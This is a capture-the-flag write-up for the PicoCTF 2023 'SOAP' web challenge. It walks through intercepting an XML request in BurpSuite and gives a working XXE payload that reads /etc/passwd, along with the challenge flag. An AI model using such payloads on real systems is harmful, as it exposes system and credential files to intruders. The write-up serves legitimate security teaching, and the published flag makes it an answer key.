

# CTF Writeup: PicoCTF2023 Challenge - SOAP

## Challenge Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Process
To solve this challenge, I followed these steps:

1. I launched an instance and visited the web portal it generated.
2. I loaded the web page in BurpSuite, as I needed to view a file.
3. I clicked on `Details`, intercepted the request with BurpSuite, and saw that the request returned a section of 
```
<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>
```
4. I sent this request to the Repeater, and upon sending it, the response returned a section of 
```
<strong>Special Info::::</strong> Created By security and privacy experts
```
5. I then tested for an XXE (external entity injection) vulnerability by changing the `2` in the request to `0`. The response returned `Invalid ID: 0`.
6. I added the following code 
```
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
``` 
and changed the ID to `&example;`. This would replace `&example;` with `Doe` in the response. I set the code section to 
```
<!DOCTYPE replace [<!ENTITY example "0"> ]>
``` 
The response returned `Invalid ID: 0`.
7. I changed the `example` entity to `test` and the ID to `&test;`. I replaced the original 
```
<!DOCTYPE replace [<!ENTITY example "0"> ]>
``` 
with 
```
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
``` 
This would retrieve the contents of the `/etc/passwd` file. The full section of code became 
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><data><ID>&test;</ID></data>
```
8. I sent this request, and the response showed the flag 
```
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

## Flag
The flag for the `SOAP` challenge is:
```
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

I hope this writeup was helpful in understanding the steps needed to solve the `SOAP` challenge.
